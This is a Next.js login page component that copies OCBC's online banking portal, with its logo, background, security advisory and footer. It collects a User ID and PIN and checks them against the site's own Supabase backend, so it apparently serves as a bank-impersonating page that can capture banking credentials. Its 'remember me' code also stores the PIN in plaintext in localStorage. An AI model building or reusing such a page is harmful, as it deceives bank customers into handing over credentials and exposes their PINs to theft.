"use client";

import { Lock, ChevronUp, ChevronDown } from "lucide-react";
import Link from "next/link";
import { useState, useEffect } from "react";
import { supabase } from "@/lib/supabase";
import { Eye, EyeOff } from "lucide-react";

export default function LoginPage() {
  const [isAdvisoryExpanded, setIsAdvisoryExpanded] = useState(true);
  const [isLoading, setIsLoading] = useState(false);
  const [authError, setAuthError] = useState("");
  const [rememberMe, setRememberMe] = useState(false);
  const [showPass, setShowPass] = useState(false);

  useEffect(() => {
    // Pre-fill user ID and PIN if remember me was used before
    const savedUserId = localStorage.getItem("ocbc_remembered_user");
    const savedPin = localStorage.getItem("ocbc_remembered_pin");
    if (savedUserId) {
      const idInput = document.getElementById("userId") as HTMLInputElement;
      if (idInput) idInput.value = savedUserId;
      
      if (savedPin) {
        const pinInput = document.getElementById("pin") as HTMLInputElement;
        if (pinInput) pinInput.value = savedPin;
      }
      
      setRememberMe(true);
    }
  }, []);

  const handleLogin = async (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    setIsLoading(true);
    setAuthError("");

    const form = e.currentTarget;
    const userId = (form.elements.namedItem("userId") as HTMLInputElement).value;
    const pin = (form.elements.namedItem("pin") as HTMLInputElement).value;

    try {
      // 1. Verify User ID and PIN with our backend to get the actual email
      const response = await fetch('/api/auth/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ userId, pin })
      });

      const data = await response.json();

      if (!response.ok) {
        throw new Error(data.error || "Invalid User ID or PIN");
      }

      // 2. Perform the actual Supabase sign-in using the email and pin
      const { error: signInError } = await supabase.auth.signInWithPassword({
        email: data.email,
        password: pin,
      });

      if (signInError) {
        throw new Error("Invalid User ID or PIN"); // obscure the actual auth error for security
      }

      // 3. Handle Remember Me
      if (rememberMe) {
        localStorage.setItem("ocbc_remembered_user", userId);
        localStorage.setItem("ocbc_remembered_pin", pin);
      } else {
        localStorage.removeItem("ocbc_remembered_user");
        localStorage.removeItem("ocbc_remembered_pin");
      }

      // Login successful! Redirect based on account type
      if (data.account_type === 'admin') {
        window.location.href = "/admin";
      } else {
        window.location.href = "/dashboard";
      }
      
    } catch (err: any) {
      setAuthError(err.message);
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <main className="min-h-screen relative flex flex-col bg-gray-100">
      
      {/* Background Image - Official OCBC background provided by user */}
      <div 
        className="absolute inset-0 z-0 bg-cover bg-center"
        style={{ backgroundImage: "url('/backround img.png')" }}
      />
      
      {/* Security Advisory Top Bar - Toggleable */}
      <div className="w-full bg-[#2A313C] text-white py-2 px-4 flex justify-between items-start z-20 shadow-md transition-all duration-300">
        {isAdvisoryExpanded ? (
          <p className="text-[11px] font-medium leading-relaxed max-w-[90%] mx-auto lg:mx-0 lg:pl-32">
            <span className="text-orange-500 font-bold mr-1">• Security advisory:</span> 
            Do not click on links in emails or SMS messages that charge fees for failed parcel deliveries. If a caller claiming to be from your telecommunications company informs you of a fraudulent phone purchase with a mobile plan, end the call immediately. Do not disclose your banking or card details. <a href="#" className="underline underline-offset-2 hover:text-gray-300">Learn more</a>
          </p>
        ) : (
          <p className="text-[11px] font-medium leading-relaxed max-w-[90%] mx-auto lg:mx-0 lg:pl-32">
            <span className="text-orange-500 font-bold mr-1">• Security advisory:</span> 
            Protect yourself from phishing and scams. <span className="text-gray-400">Click to read more.</span>
          </p>
        )}
        <button 
          onClick={() => setIsAdvisoryExpanded(!isAdvisoryExpanded)} 
          className="text-gray-400 hover:text-white mt-0.5 ml-4 flex-shrink-0"
        >
          {isAdvisoryExpanded ? <ChevronUp className="w-5 h-5" /> : <ChevronDown className="w-5 h-5" />}
        </button>
      </div>

      {/* Main Content Area */}
      <div className="flex-1 flex flex-col z-10 w-full max-w-[1200px] mx-auto px-4 sm:px-6 lg:px-8 pt-8 lg:pt-20">
        
        <div className="w-full max-w-[420px] mx-auto lg:mx-0 lg:ml-[8%] xl:ml-[12%]">
          {/* OCBC Logo */}
          <div className="mb-6 lg:mb-8 flex justify-center lg:justify-start">
            <Link href="/" className="inline-block hover:opacity-90 transition-opacity">
              <img src="/logo_main.png" alt="OCBC Logo" className="w-[180px] md:w-[220px] object-contain" />
            </Link>
          </div>

          {/* Login White Card */}
          <div className="bg-white w-full shadow-[0_20px_40px_rgba(0,0,0,0.15)] rounded-sm overflow-hidden flex flex-col border border-gray-100">
            
            <div className="px-6 md:px-8 pt-8 md:pt-10 pb-10 md:pb-12">
            
            <div className="flex items-center justify-center lg:justify-start text-gray-400 mb-6 space-x-1.5">
              <Lock className="w-3.5 h-3.5" strokeWidth={2.5} />
              <span className="text-[11px] font-semibold uppercase tracking-wider">Secure Site</span>
            </div>

            <h1 className="text-[26px] md:text-[28px] font-semibold text-[#333333] mb-10 text-center lg:text-left tracking-tight">
              Online Banking
            </h1>

            <form className="space-y-8 md:space-y-10" onSubmit={handleLogin}>
              
              {authError && (
                <div className="bg-red-50 text-red-600 p-3 rounded-md text-[13px] font-medium border border-red-100">
                  {authError}
                </div>
              )}

              <div className="w-full mb-6 mt-2">
                <label htmlFor="userId" className="block text-[13px] text-gray-700 mb-2 font-medium">User ID (Access code)</label>
                <input 
                  type="text" 
                  id="userId"
                  name="userId"
                  className="w-full bg-white border border-[#D1D5DB] focus:border-[#E81C24] focus:ring-1 focus:ring-[#E81C24] rounded-md px-3 py-3 text-[16px] md:text-[15px] text-gray-900 placeholder-gray-400 outline-none shadow-sm transition-colors"
                  placeholder="Enter User ID"
                  required
                />
              </div>

              <div className="w-full mb-4">
                <label htmlFor="pin" className="block text-[13px] text-gray-700 mb-2 font-medium">PIN</label>
                <div className="relative">
                    <input 
                  type={showPass ? "text" : "password"} 
                  id="pin"
                  name="pin"
                  className="w-full bg-white border border-[#D1D5DB] focus:border-[#E81C24] focus:ring-1 focus:ring-[#E81C24] rounded-md px-3 py-3 text-[16px] md:text-[15px] text-gray-900 placeholder-gray-400 outline-none shadow-sm transition-colors"
                  placeholder="••••••••"
                  required
                />
                    <button type="button" onClick={() => setShowPass(!showPass)} className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600 z-10">
                      {showPass ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
                    </button>
                  </div>
              </div>

              <div className="flex items-center mt-2 mb-8">
                <label className="inline-flex items-center space-x-2.5 cursor-pointer group">
                  <div className="relative flex items-center justify-center">
                    <input type="checkbox" checked={rememberMe} onChange={(e) => setRememberMe(e.target.checked)} className="peer sr-only" />
                    <div className="w-[18px] h-[18px] border-2 border-gray-300 rounded-[3px] bg-white peer-checked:bg-[#E81C24] peer-checked:border-[#E81C24] transition-colors shadow-sm"></div>
                    <svg className="absolute w-3 h-3 text-white opacity-0 peer-checked:opacity-100 transition-opacity" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth="3"><path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7"></path></svg>
                  </div>
                  <span className="text-[13px] text-gray-600 font-medium group-hover:text-gray-900 transition-colors">Remember me</span>
                </label>
              </div>

              <button 
                type="submit"
                disabled={isLoading}
                className={`w-full bg-[#E81C24] hover:bg-[#c7131a] active:bg-[#a60e14] text-white font-semibold py-3.5 rounded-sm transition-colors mt-4 text-[15px] shadow-sm flex items-center justify-center ${isLoading ? 'opacity-70 cursor-not-allowed' : ''}`}
              >
                {isLoading ? (
                  <svg className="animate-spin h-5 w-5 text-white" fill="none" viewBox="0 0 24 24"><circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle><path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path></svg>
                ) : "Login"}
              </button>
            </form>

            <div className="mt-6 text-center flex flex-col space-y-3">
              <Link href="/forgot-password" className="text-[#0072C6] hover:underline text-[12px] font-medium">
                Forgot your User ID or PIN?
              </Link>
              <Link href="/register" className="text-[#0072C6] hover:underline text-[12px] font-medium">
                No User ID (Access Code)/PIN? Apply now.
              </Link>
            </div>

          </div>

          {/* Bottom Footer Section of the Card */}
          <div className="bg-[#FAFAFA] px-6 md:px-8 py-5 md:py-6 border-t border-gray-100 flex flex-col space-y-2 text-center lg:text-left">
            <a href="#" className="text-[#0072C6] hover:underline text-[13px] font-medium">
              Log in via Singpass
            </a>
            <div className="text-[13px] text-gray-600">
              Don't have Online Banking? <Link href="/register" className="text-[#0072C6] hover:underline font-medium">Sign up now.</Link>
            </div>
          </div>

        </div>
        </div>

      </div>

      {/* Global Footer resting on background - Left aligned, grey text like screenshot */}
      <div className="w-full max-w-[1200px] mx-auto px-4 sm:px-6 lg:px-8 pb-8 z-10 mt-4 lg:mt-8">
        <div className="lg:ml-[8%] xl:ml-[12%] flex flex-wrap justify-center lg:justify-start items-center gap-y-2 text-[10px] md:text-[11px] text-gray-500 font-medium tracking-wide">
          <span className="mr-2 w-full text-center lg:w-auto lg:text-left">&copy; OCBC. All Rights Reserved.</span>
          <a href="#" className="hover:text-gray-700 transition-colors">Conditions of Access</a>
          <span className="mx-2 hidden sm:inline">|</span>
          <a href="#" className="hover:text-gray-700 transition-colors">Policies</a>
          <span className="mx-2 hidden sm:inline">|</span>
          <a href="#" className="hover:text-gray-700 transition-colors">Security</a>
          <span className="mx-2 hidden sm:inline">|</span>
          <a href="#" className="hover:text-gray-700 transition-colors">Need Help?</a>
        </div>
      </div>

      {/* Full-Screen Loader Overlay */}
      {isLoading && (
        <div className="fixed inset-0 z-[100] bg-black/40 backdrop-blur-[2px] flex items-center justify-center">
          <svg className="animate-spin w-12 h-12 text-[#00c5c5]" viewBox="0 0 50 50">
            <circle 
              className="opacity-100"
              cx="25" cy="25" r="20" 
              fill="none" 
              stroke="currentColor" 
              strokeWidth="2"
              strokeDasharray="90 150"
              strokeLinecap="round"
            />
          </svg>
        </div>
      )}

    </main>
  );
}
